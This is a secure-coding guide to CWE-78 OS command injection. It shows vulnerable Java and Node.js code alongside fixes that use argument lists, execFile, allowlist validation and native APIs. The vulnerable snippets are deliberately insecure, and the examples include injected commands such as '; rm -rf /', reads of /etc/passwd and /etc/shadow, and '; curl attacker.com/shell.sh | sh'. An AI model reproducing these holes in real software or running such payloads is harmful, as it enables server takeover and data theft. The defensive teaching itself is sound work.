Why Is This an Issue?

CWE-78 flags code that constructs operating system commands from untrusted input and executes them via a system shell. Unlike code injection (CWE-94), which targets the application's own runtime, command injection targets the underlying operating system — giving an attacker the ability to run arbitrary OS commands with the full privileges of the application process.

The root cause is almost always string concatenation of user input into a shell command. Attackers exploit shell metacharacters like ;, |, &&, or $(…) to chain their own commands onto the intended one. A single unvalidated parameter can lead to full server compromise.

This weakness is ranked in the SANS/CWE Top 25 and maps to OWASP A03:2021 — Injection. The safest approach is to avoid invoking OS commands altogether. When that isn't possible, use parameterized APIs that never pass input through a shell interpreter.

Examples of the Issue

Dangerous: Java Runtime.exec() with concatenated user input

A servlet accepts a hostname from the user and passes it directly to Runtime.exec() as a single concatenated string. An attacker can submit google.com; cat /etc/passwd to execute arbitrary commands after the intended ping.

// DANGEROUS: User input concatenated directly into a shell command. @WebServlet("/ping") public class PingServlet extends HttpServlet { protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String host = req.getParameter("host"); // e.g. "google.com" or "google.com; rm -rf /" // The single-string form is parsed by the OS shell, which interprets // semicolons, pipes, and other metacharacters. Process proc = Runtime.getRuntime().exec("ping -c 3 " + host); try (BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream()))) { String line; while ((line = reader.readLine()) != null) { resp.getWriter().println(line); } } } }

Dangerous: Node.js child_process.exec() with user input

child_process.exec() spawns a shell (/bin/sh) and passes the entire string to it. An attacker can exploit shell operators like $(…) or | to chain arbitrary commands. For example, submitting ; curl attacker.com/shell.sh | sh downloads and runs a reverse shell.

// DANGEROUS: exec() spawns a shell and interprets all metacharacters. const { exec } = require('child_process'); const express = require('express'); const app = express(); app.get('/lookup', (req, res) => { const domain = req.query.domain; // e.g. "example.com" or "; cat /etc/shadow" // The shell interprets semicolons, pipes, backticks, $(), etc. exec(`nslookup ${domain}`, (err, stdout, stderr) => { if (err) return res.status(500).json({ error: stderr }); res.json({ output: stdout }); }); });

Dangerous: ProcessBuilder through a shell (sh -c)

Using ProcessBuilder with sh -c (or cmd /c on Windows) defeats the safety of its argument-list API. The third argument is passed to the shell as a single string, re-introducing the same metacharacter injection risk as Runtime.exec().

// DANGEROUS: Invoking "sh -c" passes everything through a shell interpreter. String filename = request.getParameter("file"); // e.g. "report.pdf" or "; rm -rf /" ProcessBuilder pb = new ProcessBuilder("sh", "-c", "cat /opt/reports/" + filename); pb.redirectErrorStream(true); Process proc = pb.start(); try (BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream()))) { String line; while ((line = reader.readLine()) != null) { response.getWriter().println(line); } }

How to Resolve

Fix (Java): Use ProcessBuilder with an explicit argument list — no shell

ProcessBuilder accepts arguments as a list. Each element is passed directly to the OS as a separate argv entry — no shell is invoked, so metacharacters like ; and | are treated as literal characters. Always combine this with input validation via an allowlist.

// SAFE: Each argument is a separate list element — no shell interpretation. @WebServlet("/ping") public class PingServlet extends HttpServlet { private static final Pattern HOSTNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9.\\-]+$"); // Allowlist: hostname chars only protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String host = req.getParameter("host"); // Step 1: Validate against an allowlist. if (host == null || !HOSTNAME_PATTERN.matcher(host).matches()) { resp.sendError(400, "Invalid hostname."); return; } // Step 2: Pass arguments as a list — never concatenate into a string. ProcessBuilder pb = new ProcessBuilder("ping", "-c", "3", host); pb.redirectErrorStream(true); Process proc = pb.start(); try (BufferedReader reader = new BufferedReader( new InputStreamReader(proc.getInputStream()))) { String line; while ((line = reader.readLine()) != null) { resp.getWriter().println(line); } } } }

Fix (JS): Replace exec() with execFile() — no shell spawned

child_process.execFile() executes the binary directly without spawning a shell. Arguments are passed as an array, making shell metacharacter injection impossible. Always pair this with input validation to restrict values to expected patterns.

// SAFE: execFile() does NOT spawn a shell — metacharacters are harmless. const { execFile } = require('child_process'); const express = require('express'); const app = express(); app.get('/lookup', (req, res) => { const domain = req.query.domain; // Step 1: Allowlist validation — hostname characters only. if (!/^[a-zA-Z0-9.\-]+$/.test(domain)) { return res.status(400).json({ error: 'Invalid domain' }); } // Step 2: execFile passes args as argv — no shell interpretation. execFile('nslookup', [domain], (err, stdout, stderr) => { if (err) return res.status(500).json({ error: stderr }); res.json({ output: stdout }); }); });

Fix (Java): Avoid OS commands entirely — use native APIs

The safest fix is to eliminate the OS command entirely. Java and Node.js both have built-in APIs for common tasks like DNS lookups, file operations, and network checks. Using native APIs removes the entire attack surface — there is no command string to inject into.

// SAFE: Use Java's built-in InetAddress instead of shelling out to "ping". import java.net.InetAddress; @WebServlet("/ping") public class PingServlet extends HttpServlet { private static final Pattern HOSTNAME_PATTERN = Pattern.compile("^[a-zA-Z0-9.\\-]+$"); protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String host = req.getParameter("host"); if (host == null || !HOSTNAME_PATTERN.matcher(host).matches()) { resp.sendError(400, "Invalid hostname."); return; } try { InetAddress address = InetAddress.getByName(host); boolean reachable = address.isReachable(5000); // 5-second timeout resp.getWriter().printf("Host: %s (%s) — %s%n", host, address.getHostAddress(), reachable ? "Reachable" : "Unreachable"); } catch (Exception e) { resp.sendError(400, "Could not resolve hostname."); } } }
